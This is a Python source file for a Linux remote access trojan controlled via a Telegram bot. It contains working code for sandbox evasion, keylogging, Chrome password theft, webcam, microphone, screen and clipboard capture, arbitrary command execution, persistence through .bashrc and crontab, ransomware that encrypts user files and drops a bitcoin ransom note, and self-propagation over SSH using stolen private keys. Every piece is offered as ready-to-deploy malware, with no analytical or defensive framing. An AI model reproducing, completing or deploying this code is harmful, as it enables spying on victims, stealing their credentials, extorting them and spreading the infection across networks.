import telebot
import os
import platform
import socket
import uuid
import subprocess
import threading
import time
import pyautogui
import cv2
import pynput.keyboard as kb
from PIL import ImageGrab
import sqlite3
import shutil
import hashlib
import getpass
import sys
import json
import base64
import pyperclip
import sounddevice as sd
import soundfile as sf
import psutil
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import netifaces
import paramiko
import glob

# ===================== CONFIG =====================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"          # ← غيرها
ALLOWED_CHAT_ID = 123456789                # ← غيرها

# ===================== HWID =====================
def generate_hwid():
    try:
        with open('/etc/machine-id', 'r') as f:
            machine_id = f.read().strip()
        cpu = platform.processor()
        user = getpass.getuser()
        combined = f"{machine_id}{cpu}{user}"
        return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        return str(uuid.uuid4())[:16].upper()

VICTIM_HWID = generate_hwid()

# ===================== ANTI-VM / ANTI-DEBUG =====================
def is_vm_or_sandbox():
    suspicious = ["qemu", "virtualbox", "vmware", "xen", "kvm"]
    try:
        with open('/proc/cpuinfo', 'r') as f:
            if 'hypervisor' in f.read().lower():
                return True
        output = subprocess.check_output("dmidecode -s system-manufacturer 2>/dev/null || echo ''", shell=True, text=True).lower()
        if any(vm in output for vm in suspicious):
            return True
    except:
        pass
    if psutil.virtual_memory().total < 2 * 1024**3 or psutil.cpu_count() < 2:
        return True
    return False

if is_vm_or_sandbox():
    sys.exit(0)

# ===================== BOT =====================
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== KEYLOGGER =====================
log_file = os.path.join(os.getenv("HOME", "/tmp"), ".cache/shadow_keys.log")
current_log = ""

def on_press(key):
    global current_log
    try:
        current_log += key.char if hasattr(key, 'char') and key.char else f"[{key}]"
    except:
        pass
    if len(current_log) > 100:
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {current_log}\n")
        current_log = ""

listener = kb.Listener(on_press=on_press)
listener.start()

def auto_send_keylogs():
    while True:
        time.sleep(600)
        try:
            if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
                with open(log_file, "r", encoding="utf-8") as f:
                    logs = f.read()
                send_to_c2(text=f"Keylogs (last 10 min):\n{logs}")
                open(log_file, "w").close()
        except:
            pass

threading.Thread(target=auto_send_keylogs, daemon=True).start()

# ===================== SEND FUNCTION =====================
def send_to_c2(text=None, photo=None, document=None, caption=None):
    victim_tag = f"Linux Victim: {VICTIM_HWID}"
    try:
        if text:
            bot.send_message(ALLOWED_CHAT_ID, f"{victim_tag}\n{text}")
        elif photo:
            bot.send_photo(ALLOWED_CHAT_ID, photo, caption=f"{victim_tag}\n{caption or ''}")
        elif document:
            bot.send_document(ALLOWED_CHAT_ID, document, caption=f"{victim_tag}\n{caption or ''}")
    except:
        pass

# ===================== INITIAL INFO =====================
def send_initial_info():
    info = f"""
NEW LINUX VICTIM CONNECTED!
HWID: {VICTIM_HWID}
OS: {platform.system()} {platform.release()}
User: {getpass.getuser()}
IP: {socket.gethostbyname(socket.gethostname())}
Processor: {platform.processor()}
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
    """
    send_to_c2(text=info)

    try:
        screenshot = ImageGrab.grab()
        screenshot.save("/tmp/init.png")
        send_to_c2(photo=open("/tmp/init.png", "rb"))
        os.remove("/tmp/init.png")
    except:
        pass

# ===================== CHROME PASSWORD STEALER (Linux) =====================
def get_chrome_master_key():
    path = os.path.expanduser("~/.config/google-chrome/Local State")
    if not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
        enc_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        return enc_key[5:]  # remove 'DPAPI' prefix (even on Linux sometimes present)
    except:
        return None

def decrypt_chrome_password(enc_value, master_key):
    try:
        if enc_value.startswith(b"v1"):
            enc_value = enc_value[3:]
        nonce = enc_value[:12]
        ciphertext_tag = enc_value[12:]
        aesgcm = AESGCM(master_key)
        return aesgcm.decrypt(nonce, ciphertext_tag, None).decode("utf-8", errors="ignore")
    except:
        return "[failed]"

def steal_chrome_passwords():
    db_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    if not os.path.exists(db_path):
        send_to_c2(text="Chrome Login Data not found")
        return

    master_key = get_chrome_master_key()
    if not master_key:
        send_to_c2(text="Could not extract Chrome master key")
        return

    temp_db = "/tmp/temp_login.db"
    shutil.copy2(db_path, temp_db)

    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        results = []
        for url, user, enc_pass in cursor.fetchall():
            if enc_pass:
                pw = decrypt_chrome_password(enc_pass, master_key)
                results.append(f"{url} | {user} | {pw}")
        if results:
            send_to_c2(text="Chrome passwords:\n" + "\n".join(results[:30]))
        else:
            send_to_c2(text="No passwords decrypted")
        conn.close()
    except Exception as e:
        send_to_c2(text=f"Chrome password error: {str(e)}")
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

# ===================== FILE MANAGER =====================
def handle_file_manager(cmd_parts):
    action = cmd_parts[0].lower()
    path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else os.getcwd()

    if action in ["/list", "/ls"]:
        try:
            files = "\n".join(os.listdir(path))
            send_to_c2(text=f"Files in {path}:\n{files}")
        except Exception as e:
            send_to_c2(text=f"Error: {str(e)}")

    elif action in ["/delete", "/del"]:
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path)
            send_to_c2(text=f"Deleted: {path}")
        except Exception as e:
            send_to_c2(text=f"Delete error: {str(e)}")

    elif action == "/rename":
        if len(cmd_parts) < 3:
            send_to_c2(text="Usage: /rename old new")
            return
        old = path
        new = " ".join(cmd_parts[2:])
        try:
            os.rename(old, new)
            send_to_c2(text=f"Renamed {old} → {new}")
        except Exception as e:
            send_to_c2(text=f"Rename error: {str(e)}")

    elif action == "/mkdir":
        try:
            os.makedirs(path, exist_ok=True)
            send_to_c2(text=f"Created: {path}")
        except Exception as e:
            send_to_c2(text=f"Mkdir error: {str(e)}")

    elif action == "/download":
        if os.path.exists(path):
            send_to_c2(document=open(path, "rb"), caption=f"Download: {path}")
        else:
            send_to_c2(text="File not found")

# ===================== PERSISTENCE =====================
def add_persistence():
    exe = os.path.abspath(sys.argv[0])
    try:
        bashrc = os.path.expanduser("~/.bashrc")
        if os.path.exists(bashrc):
            with open(bashrc, "a") as f:
                f.write(f"\n# shadow\n[ -z \"$SSH_CONNECTION\" ] && nohup python3 {exe} >/dev/null 2>&1 &\n")
    except:
        pass

    try:
        cron = f"(crontab -l 2>/dev/null; echo '@reboot python3 {exe}') | crontab -"
        subprocess.run(cron, shell=True, timeout=8, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

add_persistence()

# ===================== RANSOMWARE =====================
MASTER_KEY = Fernet.generate_key()
RANSOMWARE_ACTIVE = False

TARGET_EXTS = [".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".jpg",".png",".mp3",".mp4",".zip",".rar",".txt",".sql",".wallet",".bak"]
TARGET_DIRS = [os.path.expanduser(f"~/{d}") for d in ["Desktop","Documents","Downloads","Pictures","Music","Videos"]]

def encrypt_file(fp):
    try:
        with open(fp, "rb") as f:
            data = f.read()
        fernet = Fernet(MASTER_KEY)
        enc = fernet.encrypt(data)
        new_fp = fp + ".SHADOW"
        with open(new_fp, "wb") as f:
            f.write(enc)
        os.remove(fp)
        return True
    except:
        return False

def create_ransom_note():
    note = f"""
YOUR FILES ARE ENCRYPTED BY SHADOW 2026
Victim ID: {VICTIM_HWID}
Pay 0.07 BTC → bc1qshadow2026dem0nxxxxxxxxxxxxxx
Proof + ID → @ShadowDecrypt2026
72 hours or price doubles + key deleted
Files: .SHADOW
"""
    with open(os.path.expanduser("~/Desktop/READ_ME.txt"), "w") as f:
        f.write(note)

def ransomware_attack():
    global RANSOMWARE_ACTIVE
    if RANSOMWARE_ACTIVE: return
    RANSOMWARE_ACTIVE = True
    send_to_c2(text=f"RANSOMWARE ACTIVE\nMaster Key: {base64.urlsafe_b64encode(MASTER_KEY).decode()}")
    create_ransom_note()
    count = 0
    for d in TARGET_DIRS:
        if not os.path.exists(d): continue
        for root, _, files in os.walk(d):
            for f in files:
                if any(f.lower().endswith(e) for e in TARGET_EXTS):
                    if encrypt_file(os.path.join(root, f)):
                        count += 1
    send_to_c2(text=f"Encrypted {count} files")

# ===================== SSH SPREAD =====================
def steal_ssh_keys():
    d = os.path.expanduser("~/.ssh")
    if not os.path.exists(d): return [], []
    keys = []
    hosts = []
    for pat in ["id_rsa", "id_ecdsa", "id_ed25519", "*.pem"]:
        for kp in glob.glob(os.path.join(d, pat)):
            if os.path.isfile(kp) and not kp.endswith(".pub"):
                try:
                    with open(kp) as f: keys.append((kp, f.read()))
                except: pass
    kh = os.path.join(d, "known_hosts")
    if os.path.exists(kh):
        try:
            with open(kh) as f:
                for line in f:
                    if line.strip() and not line.startswith("#"):
                        h = line.split()[0].split(",")[0].strip()
                        if h and "." in h: hosts.append(h)
        except: pass
    return keys, list(set(hosts))

def ssh_spread():
    keys, targets = steal_ssh_keys()
    if not keys or not targets:
        send_to_c2(text="No SSH keys/hosts for spread")
        return
    exe_name = os.path.basename(sys.argv[0])
    script = os.path.abspath(sys.argv[0])
    count = 0
    for target in targets[:8]:
        for _, key_content in keys:
            try:
                tmp_key = "/tmp/id_tmp"
                with open(tmp_key, "w") as f: f.write(key_content)
                os.chmod(tmp_key, 0o600)
                transport = paramiko.Transport((target, 22))
                transport.connect(username=getpass.getuser(), pkey=paramiko.RSAKey.from_private_key_file(tmp_key))
                sftp = paramiko.SFTPClient.from_transport(transport)
                remote = f"/tmp/{exe_name}"
                sftp.put(script, remote)
                sftp.chmod(remote, 0o755)
                _, stdout, _ = transport.open_session().exec_command(f"nohup python3 {remote} >/dev/null 2>&1 &")
                transport.close()
                count += 1
                send_to_c2(text=f"SSH → {target}")
                os.remove(tmp_key)
                break
            except:
                if os.path.exists("/tmp/id_tmp"): os.remove("/tmp/id_tmp")
    send_to_c2(text=f"SSH spread: {count}/{len(targets)}")

threading.Thread(target=ssh_spread, daemon=True).start()

# ===================== COMMANDS =====================
@bot.message_handler(func=lambda m: m.chat.id == ALLOWED_CHAT_ID)
def handle(m):
    t = m.text.strip().lower()
    parts = t.split()
    cmd = parts[0]

    if cmd == "/start":
        send_to_c2("Linux RAT Online 🖤\n/help")

    elif cmd == "/help":
        send_to_c2("""
 /sysinfo
 /screenshot
 /webcam
 /keylog
 /passwords     ← Chrome passwords attempt
 /clipboard
 /mic <sec>
 /upload
 /download <path>
 /list <path>
 /delete <path>
 /rename <old> <new>
 /mkdir <path>
 /exec <cmd>
 /shutdown
 /restart
 /ransom_go
 /ransom_status
        """)

    elif cmd == "/sysinfo":
        send_to_c2(f"HWID: {VICTIM_HWID}\nOS: {platform.system()} {platform.release()}\nUser: {getpass.getuser()}")

    elif cmd == "/screenshot":
        try:
            s = ImageGrab.grab()
            s.save("/tmp/screen.png")
            send_to_c2(photo=open("/tmp/screen.png","rb"))
            os.remove("/tmp/screen.png")
        except Exception as e:
            send_to_c2(f"Screenshot fail: {e}")

    elif cmd == "/webcam":
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("/tmp/cam.jpg", frame)
                send_to_c2(photo=open("/tmp/cam.jpg","rb"))
                os.remove("/tmp/cam.jpg")
            cap.release()
        except Exception as e:
            send_to_c2(f"Webcam fail: {e}")

    elif cmd == "/keylog":
        if os.path.exists(log_file):
            with open(log_file,"r") as f: send_to_c2(f"Keylogs:\n{f.read()}")
        else:
            send_to_c2("No logs yet")

    elif cmd == "/passwords":
        steal_chrome_passwords()

    elif cmd == "/clipboard":
        try:
            send_to_c2(f"Clipboard:\n{pyperclip.paste()}")
        except:
            send_to_c2("Clipboard error")

    elif cmd.startswith("/mic "):
        try:
            sec = int(parts[1])
            fs = 44100
            rec = sd.rec(int(sec * fs), samplerate=fs, channels=2)
            sd.wait()
            fn = f"/tmp/mic_{int(time.time())}.wav"
            sf.write(fn, rec, fs)
            send_to_c2(document=open(fn,"rb"), caption=f"Mic {sec}s")
            os.remove(fn)
        except:
            send_to_c2("Usage: /mic 30")

    elif cmd.startswith("/upload"):
        if m.document:
            try:
                fi = bot.get_file(m.document.file_id)
                data = bot.download_file(fi.file_path)
                p = os.path.join(os.getcwd(), m.document.file_name)
                with open(p, "wb") as f: f.write(data)
                send_to_c2(f"Uploaded: {p}")
            except Exception as e:
                send_to_c2(f"Upload fail: {e}")
        else:
            send_to_c2("Attach file with /upload")

    elif cmd.startswith("/download"):
        handle_file_manager(["/download"] + parts[1:])

    elif cmd in ["/list","/ls","/delete","/del","/rename","/mkdir"]:
        handle_file_manager(parts)

    elif cmd.startswith("/exec "):
        c = " ".join(parts[1:])
        try:
            o = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
            send_to_c2(f"Output:\n{o}")
        except Exception as e:
            send_to_c2(f"Exec error: {e}")

    elif cmd == "/shutdown":
        subprocess.call("shutdown -h now", shell=True)

    elif cmd == "/restart":
        subprocess.call("reboot", shell=True)

    elif cmd == "/ransom_go":
        if not RANSOMWARE_ACTIVE:
            threading.Thread(target=ransomware_attack, daemon=True).start()
            send_to_c2("Ransomware launched 🔥")
        else:
            send_to_c2("Already active")

    elif cmd == "/ransom_status":
        send_to_c2(f"Active: {RANSOMWARE_ACTIVE}\nKey: {base64.urlsafe_b64encode(MASTER_KEY).decode()}")

# ===================== MAIN =====================
def start_bot():
    while True:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(10)

if __name__ == "__main__":
    send_initial_info()
    threading.Thread(target=start_bot, daemon=True).start()
    while True:
        time.sleep(3600)
